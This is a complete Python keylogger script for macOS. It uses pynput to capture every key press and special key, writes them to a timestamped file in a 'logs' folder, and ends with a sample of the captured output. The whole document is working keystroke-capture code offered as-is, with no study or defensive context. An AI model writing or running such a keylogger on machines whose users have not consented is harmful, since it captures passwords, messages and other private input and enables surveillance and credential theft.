from pynput import keyboard
import logging
import os
from datetime import datetime

# Create log directory
if not os.path.exists("logs"):
    os.makedirs("logs")

# Create timestamped log file
log_file = f"logs/mac_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Handle key press
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# Start the keylogger
def start_keylogger():
    print("Keylogger started on macOS... Press CTRL+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()


## Output Example

2025-07-26 19:21:01,123 - Key pressed: h
2025-07-26 19:21:01,456 - Key pressed: i
2025-07-26 19:21:02,000 - Special key: Key.enter
